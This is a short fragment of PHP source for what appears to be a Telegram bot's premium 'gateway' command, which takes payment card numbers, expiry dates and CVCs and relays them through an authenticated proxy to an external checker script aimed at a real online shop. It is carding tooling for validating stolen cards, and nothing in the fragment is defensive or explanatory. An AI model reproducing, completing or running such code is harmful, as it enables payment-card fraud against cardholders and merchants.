...
$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/ya', '/Ya', '/yA', '/YA', '!ya', '!Ya', '!yA', '!YA', '.ya', '.YA', '.yA', '.Ya']) && $isPremiun){
...
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/ya cc|month|year|cvc</code>",
...
/*=====  site  ======*/
$site = "https://www.herbspro.com";
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$hosting/auto/auto.php?cc=$cc&month=$month&year=$year&cvv=$cvv&site=$site");
